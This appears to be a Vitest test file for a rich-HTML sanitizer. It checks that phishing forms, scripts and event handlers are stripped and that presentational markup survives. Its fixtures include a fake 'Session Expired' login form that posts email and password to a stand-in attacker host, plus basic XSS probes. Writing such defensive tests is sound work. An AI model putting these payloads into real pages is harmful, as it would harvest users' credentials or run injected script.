import { describe, it, expect } from 'vitest'
import { sanitizeRichHTML } from '@/utils/sanitizeRichHTML'

describe('sanitizeRichHTML', () => {
	it('strips phishing form elements', () => {
		const payload =
			'<form action="https://attacker.test/steal" method="post">' +
			'<h2>Session Expired</h2>' +
			'<input name="email"><input name="password" type="password">' +
			'<button type="submit">Login</button></form>'
		const out = sanitizeRichHTML(payload)
		expect(out).not.toMatch(/<form/i)
		expect(out).not.toMatch(/<input/i)
		expect(out).not.toMatch(/<button/i)
		expect(out).not.toMatch(/attacker\.test\/steal/i)
		// non-interactive content inside the form survives
		expect(out).toMatch(/Session Expired/)
	})

	it('strips script and event handlers (DOMPurify default)', () => {
		expect(sanitizeRichHTML('<img src=x onerror=alert(1)>')).not.toMatch(/onerror/i)
		expect(sanitizeRichHTML('<script>alert(1)</script>hi')).not.toMatch(/<script/i)
	})

	it('preserves rich presentational HTML and styling classes', () => {
		const rich =
			'<div class="prose"><h2>Title</h2><p>Para</p>' +
			'<table><thead><tr><th>A</th></tr></thead>' +
			'<tbody><tr><td>1</td></tr></tbody></table>' +
			'<ul><li>item</li></ul>' +
			'<a href="https://docs.frappe.io/learning">link</a>' +
			'<img src="https://example.test/a.png"></div>'
		const out = sanitizeRichHTML(rich)
		expect(out).toMatch(/<div class="prose">/)
		expect(out).toMatch(/<table>/)
		expect(out).toMatch(/<th>A<\/th>/)
		expect(out).toMatch(/<a href="https:\/\/docs\.frappe\.io\/learning">/)
		expect(out).toMatch(/<img src="https:\/\/example\.test\/a\.png">/)
	})

	it('handles empty/null input', () => {
		expect(sanitizeRichHTML('')).toBe('')
		// @ts-expect-error null tolerated at runtime
		expect(sanitizeRichHTML(null)).toBe('')
	})
})
